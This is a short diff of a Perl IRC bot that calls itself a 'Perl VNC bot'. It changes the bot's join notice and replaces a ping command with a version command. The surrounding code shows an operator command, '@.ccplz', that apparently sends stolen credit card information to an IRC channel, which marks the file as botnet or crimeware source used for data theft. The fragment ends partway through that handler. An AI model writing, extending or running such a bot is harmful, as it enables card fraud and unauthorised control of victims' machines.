@@ -38,15 +38,15 @@ $irc->on(irc_rpl_welcome => sub {
  $irc->write(join => $channel);
  });
 $irc->on(irc_join => sub {
- $irc->write(notice => $noticechan => "9,1Perl VNC bot by independent: 12https://github.com/independentcod");
+ 
  });
 my $misc = {};
 $irc->on(irc_privmsg => sub {
  my($irc, $message) = @_;
  my $msg = $message->{params}[1];
- if ($msg =~ /@.ping/) {
-  warn 'Received PING request, sending PONG.';
-  $irc->write(notice => $noticechan => "pong");
+ if ($msg =~ /@.version/) {
+  warn 'Version request.';
+  $irc->write(notice => $noticechan => "9,1Perl VNC bot [FINAL] by independent: 12https://github.com/independentcod");
  }
  if ($msg =~ /@.ccplz/) {
   warn 'Sending CC info to IRC...';
